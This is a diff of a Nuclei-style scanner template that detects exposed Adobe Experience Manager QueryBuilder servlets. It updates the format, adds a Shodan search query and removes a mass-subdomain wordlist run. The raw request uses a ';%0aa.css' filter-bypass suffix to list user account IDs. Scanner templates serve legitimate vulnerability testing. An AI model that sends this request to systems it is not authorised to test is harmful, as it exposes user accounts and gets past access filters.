@@ -1,28 +1,23 @@
 id: aem-jcr-querybuilder
 
 info:
-  author: DhiyaneshDk
   name: Query JCR role via QueryBuilder Servlet
+  author: DhiyaneshDk
   severity: info
-  tags: aem
+  metadata:
+    max-request: 1
+    shodan-query: http.component:"Adobe Experience Manager"
+  tags: aem,misconfig,vuln
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
+http:
+  - raw:
       - |
         GET /bin/querybuilder.json.;%0aa.css?p.hits=full&property=rep:authorizableId&type=rep:User HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+        Host: {{Hostname}}
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
         Accept-Language: en-US,en;q=0.5
         Accept-Encoding: gzip, deflate
-        Connection: close
-        Upgrade-Insecure-Requests: 1
-        Cache-Control: max-age=0
+
     matchers-condition: and
     matchers:
       - type: status
@@ -34,3 +29,4 @@ requests:
           - '"success":true'
           - 'jcr:uuid'
         condition: and
+# digest: 4a0a0047304502206653befbf881b93d22164879de063eba741e310cfbb7e8c21322c78a083019b9022100adf1eb854070511e5910c62ad0bb45b86f739c6e41cf652fcb3ac3e0cfca83cd:922c64590222798bb761d5b6d8e72950
